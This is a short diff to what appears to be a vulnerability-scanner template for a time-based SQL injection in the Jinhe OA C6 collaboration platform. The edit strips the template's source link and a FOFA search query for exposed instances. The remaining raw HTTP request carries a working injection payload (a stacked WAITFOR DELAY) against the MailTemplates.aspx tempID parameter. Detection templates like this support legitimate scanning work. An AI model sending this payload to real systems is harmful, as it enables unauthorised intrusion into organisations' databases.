@@ -3,12 +3,8 @@ info:
   name: 金和OA-C6JHSoft-WebSQL延时注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/izvrkdts9rkrwyco'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: izvrkdts9rkrwyco
-    fofa: app:"金和 C6 协同管理平台"
 http:
 - raw:
   - 'GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%3BWAITFOR+DELAY+%270%3A0%3A6%27-- HTTP/1.1
